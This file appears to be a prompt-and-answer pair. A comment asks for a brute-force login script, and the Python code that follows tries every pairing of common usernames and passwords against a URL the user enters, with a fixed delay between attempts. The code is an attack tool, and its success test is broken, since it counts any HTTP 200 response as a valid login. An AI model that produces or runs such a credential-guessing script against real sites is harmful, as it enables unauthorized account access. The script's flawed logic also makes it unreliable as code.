# Question: A login page of a web application is vulnerable to brute force attacks due to the lack of rate-limiting. 
# Write a Python script that brute-forces login credentials by iterating over a list of usernames and passwords 
# and add some feature to limit the number of requests per second


import requests
import itertools
import time

usernames = ['admin', 'user1', 'user2']
passwords = ['password123', 'admin', '12345']

def brute_force_login(url, usernames, passwords, delay=1):
    for username, password in itertools.product(usernames, passwords):
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        
        
        if "Login successful" in response.text or response.status_code == 200:
            print(f'Success! Username: {username}, Password: {password}')
            break
        
        time.sleep(delay)
    else:
        print('No valid credentials found.')

url = input("Enter the target URL: ")

brute_force_login(url, usernames, passwords, delay=1)